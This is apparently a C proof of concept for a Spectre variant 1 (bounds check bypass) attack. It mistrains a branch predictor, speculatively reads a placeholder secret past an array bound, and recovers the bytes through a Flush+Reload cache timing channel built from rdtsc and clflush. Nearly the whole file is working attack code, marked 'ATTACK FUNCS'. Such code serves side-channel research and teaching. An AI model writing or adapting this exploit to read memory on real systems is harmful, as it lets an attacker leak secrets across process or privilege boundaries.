#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "IIIIIIIIIIIIIIIIIII"

#define DATA_SECRET DATA SECRET

unsigned char data[128];

static size_t CACHE_MISS = 0;
static size_t pagesize = 0;
char *mem;

/* ---- Utility Funcs ---- */
uint64_t rdtsc_begin() {
    uint64_t a, d;
    asm volatile ("mfence\n\t"
        "CPUID\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

uint64_t rdtsc_end() {
    uint64_t a, d;
    asm volatile("mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "CPUID\n\t"
        "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

static inline __attribute__((always_inline)) void mfence() {
    asm volatile("mfence");
}

void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

int cache_encode(char data) {
  maccess(mem + data * pagesize);
  return 1;
}

void flush_shared_memory() {
  for(int j = 0; j < 256; j++) {
    flush(mem + j * pagesize);
  }
}

/* --------- THRESHOLD FUNCS --------- */
int flush_reload_t(void *ptr) {
  uint64_t start = 0, end = 0;

  start = rdtsc_begin();
  maccess(ptr);
  end = rdtsc_end();
  mfence();

  flush(ptr);

  return (int)(end - start);
}

int reload_t(void *ptr) {
  uint64_t start = 0, end = 0;

  start = rdtsc_begin();
  maccess(ptr);
  end = rdtsc_end();
  mfence();

  return (int)(end - start);
}

size_t detect_flush_reload_threshold() {
  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
  size_t dummy[16];
  size_t *ptr = dummy + 8;

  maccess(ptr);
  for (i = 0; i < count; i++) {
    reload_time += reload_t(ptr);
  }
  for (i = 0; i < count; i++) {
    flush_reload_time += flush_reload_t(ptr);
  }
  reload_time /= count;
  flush_reload_time /= count;

  return (flush_reload_time + reload_time * 2) / 3;
}

/* --------- ATTACK FUNCS ---------*/

void flush_reload(void *ptr, int index) {
	uint64_t start = 0, end = 0;

	start = rdtsc_begin();
	maccess(ptr);
	end = rdtsc_end();

	mfence();

	flush(ptr);

  if (end - start < CACHE_MISS) {
    printf("%d\n", index);
  }
}

void cache_decode_pretty(char *leaked, int index) {

  flush_reload(mem + 73 * pagesize, 73);
  // for(int i = 0; i < 256; i++) {
  //   int mix_i = ((i * 167) + 73) & 255; // avoid prefetcher
  //   flush_reload(mem + mix_i * pagesize, mix_i);
  // }
}

void access_array(int x) {
	// flushing the data which is used in the condition increases
	// probability of speculation
	size_t len = sizeof(DATA) - 1;
	flush(&len);
	flush(&x);
  mfence();

	// check that only accessible part (DATA) can be accessed
	if((float)x / (float)len < 1) {
		maccess(mem + data[x] * pagesize);
	}
}

int main(int argc, const char **argv) {
  pagesize = sysconf(_SC_PAGESIZE);

  // Detect cache threshold
  if(!CACHE_MISS) 
    CACHE_MISS = detect_flush_reload_threshold();

  char *_mem = malloc(pagesize * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  // initialize memory
  memset(mem, 0, pagesize * 256);
  
  // store secret
  memset(data, ' ', sizeof(data));
  memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
  // ensure data terminates
  data[sizeof(data) / sizeof(data[0]) - 1] = '0';


  // nothing leaked so far
  char leaked[sizeof(DATA_SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(DATA_SECRET)] = 0;

  // flush our shared memory
  flush_shared_memory();
    
  int ITS = 100000;
  printf("%d\n", ITS);

  for (int i = 0; i < ITS; i++)  {
    int j = (rand() % 21) + 5;

    // mistrain with valid index
    for(int y = 0; y < 10; y++) {
      access_array(0);
    }
    flush(mem + data[0] * pagesize);

    // potential out-of-bounds access
    access_array(j);

    mfence(); // avoid speculation
    // Recover data from covert channel
    cache_decode_pretty(leaked, j);

    sched_yield();
  }

  return (0);
}
